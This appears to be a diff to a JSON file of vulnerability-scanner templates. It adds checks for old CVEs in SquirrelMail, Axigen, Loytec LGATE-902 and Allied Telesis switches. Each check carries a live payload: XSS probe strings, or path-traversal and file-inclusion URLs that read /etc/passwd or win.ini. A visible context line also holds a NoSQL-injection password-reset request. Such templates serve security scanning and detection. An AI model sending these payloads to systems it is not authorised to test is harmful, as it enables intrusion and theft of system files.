@@ -37,6 +37,95 @@
       ]
     },
     {
+      "id": "CVE-2002-1131",
+      "info": {
+        "author": "dhiyaneshDk",
+        "description": "The Virtual Keyboard plugin for SquirrelMail is prone to a cross-site scripting vulnerability because it fails to properly sanitize user-supplied input.",
+        "name": "SquirrelMail 1.2.6/1.2.7 - Multiple Cross-Site Scripting Vulnerabilities",
+        "reference": "https://www.exploit-db.com/exploits/21811",
+        "severity": "medium",
+        "tags": "xss,squirrelmail,cve,cve2002"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            },
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "</script><script>alert(document.domain)</script>"
+              ]
+            },
+            {
+              "part": "header",
+              "type": "word",
+              "words": [
+                "text/html"
+              ]
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/src/addressbook.php?%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E",
+            "{{BaseURL}}/src/options.php?optpage=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E",
+            "{{BaseURL}}/src/search.php?mailbox=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&what=x&where=BODY&submit=Search",
+            "{{BaseURL}}/src/search.php?mailbox=INBOX&what=x&where=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&submit=Search",
+            "{{BaseURL}}/src/help.php?chapter=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E"
+          ],
+          "stop-at-first-match": true
+        }
+      ]
+    },
+    {
+      "id": "CVE-2004-0519",
+      "info": {
+        "author": "dhiyaneshDk",
+        "description": "Multiple cross-site scripting (XSS) vulnerabilities in SquirrelMail 1.4.2 allow remote attackers to execute arbitrary script as other users and possibly steal authentication information via multiple attack vectors, including the mailbox parameter in compose.php.",
+        "name": "SquirrelMail 1.4.x - Folder Name Cross-Site Scripting",
+        "reference": "https://www.exploit-db.com/exploits/24068",
+        "severity": "medium",
+        "tags": "xss,squirrelmail,cve2004,cve"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            },
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "</script><script>alert(document.domain)</script>"
+              ]
+            },
+            {
+              "part": "header",
+              "type": "word",
+              "words": [
+                "text/html"
+              ]
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/mail/src/compose.php?mailbox=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2005-2428",
       "info": {
         "author": "CasperGN",
@@ -153,6 +242,40 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/%2F..%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2006-2842",
+      "info": {
+        "author": "dhiyaneshDk",
+        "description": "PHP remote file inclusion vulnerability in functions/plugin.php in SquirrelMail 1.4.6 and earlier, if register_globals is enabled and magic_quotes_gpc is disabled, allows remote attackers to execute arbitrary PHP code via a URL in the plugins array parameter.  NOTE: this issue has been disputed by third parties, who state that Squirrelmail provides prominent warnings to the administrator when register_globals is enabled.  Since the varieties of administrator negligence are uncountable, perhaps this type of issue should not be included in CVE.  However, the original developer has posted a security advisory, so there might be relevant real-world environments under which this vulnerability is applicable.",
+        "name": "Squirrelmail 1.4.x - 'Redirect.php' Local File Inclusion",
+        "reference": "https://www.exploit-db.com/exploits/27948",
+        "severity": "high",
+        "tags": "cve2006,lfi,squirrelmail,cve"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "regex": [
+                "root:[x*]:0:0"
+              ],
+              "type": "regex"
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/src/redirect.php?plugins[]=../../../../etc/passwd%00"
           ]
         }
       ]
@@ -6408,6 +6531,39 @@
           "path": [
             "{{BaseURL}}/fw/syslogViewer.do?port=%22%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E"
           ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2012-4940",
+      "info": {
+        "author": "dhiyaneshDk",
+        "description": "Multiple directory traversal vulnerabilities in the View Log Files component in Axigen Free Mail Server allow remote attackers to read or delete arbitrary files via a .. (dot dot) in (1) the fileName parameter in a download action to source/loggin/page_log_dwn_file.hsp, or the fileName parameter in (2) an edit action or (3) a delete action to the default URI.",
+        "name": "Axigen Mail Server - 'Filename' Directory Traversal",
+        "reference": "https://www.exploit-db.com/exploits/37996",
+        "severity": "high",
+        "tags": "cve,cve2012,axigen,lfi"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "condition": "and",
+              "part": "body",
+              "type": "word",
+              "words": [
+                "bit app support",
+                "fonts",
+                "extensions"
+              ]
+            }
+          ],
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/?h=44ea8a6603cbf54e245f37b4ddaf8f36&page=vlf&action=edit&fileName=..\\..\\..\\windows\\win.ini",
+            "{{BaseURL}}/source/loggin/page_log_dwn_file.hsp?h=44ea8a6603cbf54e245f37b4ddaf8f36&action=download&fileName=..\\..\\..\\windows\\win.ini"
+          ],
+          "stop-at-first-match": true
         }
       ]
     },
@@ -15400,6 +15556,49 @@
       ]
     },
     {
+      "id": "CVE-2018-14916",
+      "info": {
+        "author": "0x_Akoko",
+        "classification": {
+          "cve-id": "CVE-2018-14916",
+          "cvss-metrics": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:H",
+          "cvss-score": 9.4,
+          "cwe-id": "CWE-732"
+        },
+        "description": "Loytec LGATE-902 versions prior to 6.4.2 suffer from cross site scripting, arbitrary file deletion, and directory traversal vulnerabilities.",
+        "name": "Loytec LGATE-902 Directory Traversal",
+        "reference": [
+          "https://packetstormsecurity.com/files/152453/Loytec-LGATE-902-XSS-Traversal-File-Deletion.html",
+          "https://nvd.nist.gov/vuln/detail/CVE-2018-14916"
+        ],
+        "severity": "critical",
+        "tags": "cve,cve2018,loytec,lfi"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "regex": [
+                "root:[x*]:0:0"
+              ],
+              "type": "regex"
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/webui/file_guest?path=/var/www/documentation/../../../../../etc/passwd&flags=1152"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2018-15473",
       "info": {
         "author": "r3dg33k,daffainfo,forgedhallpass",
@@ -20700,6 +20899,49 @@
           "matchers-condition": "and",
           "raw": [
             "POST /admin/auth/reset-password HTTP/1.1\nHost: {{Hostname}}\nOrigin: {{BaseURL}}\nContent-Type: application/json\n\n{\"code\": {\"$gt\": 0}, \"password\": \"SuperStrongPassword1\", \"passwordConfirmation\": \"SuperStrongPassword1\"}\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2019-18922",
+      "info": {
+        "author": "0x_Akoko",
+        "classification": {
+          "cve-id": "CVE-2019-18922",
+          "cvss-metrics": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+          "cvss-score": 7.5,
+          "cwe-id": "CWE-22"
+        },
+        "description": "A Directory Traversal in the Web interface of the Allied Telesis AT-GS950/8 until Firmware AT-S107 V.1.1.3",
+        "name": "Allied Telesis AT-GS950/8 Directory Traversal",
+        "reference": [
+          "https://packetstormsecurity.com/files/155504/Allied-Telesis-AT-GS950-8-Directory-Traversal.html",
+          "https://www.cvedetails.com/cve/CVE-2019-18922"
+        ],
+        "severity": "high",
+        "tags": "cve,cve2019,allied,lfi"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "regex": [
+                "root:[x*]:0:0"
+              ],
+              "type": "regex"
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/../../../../../../etc/passwd"
           ]
         }
       ]
@@ -38518,10 +38760,10 @@
             },
             {
               "part": "header",
-              "type": "regex",
-              "words": [
+              "regex": [
                 "(?m)^(?:Location\\s*?:\\s*?)(?:https?://|//)(?:[a-zA-Z0-9\\-_\\.@]*)example\\.com.*$"
-              ]
+              ],
+              "type": "regex"
             }
           ],
           "matchers-condition": "and",
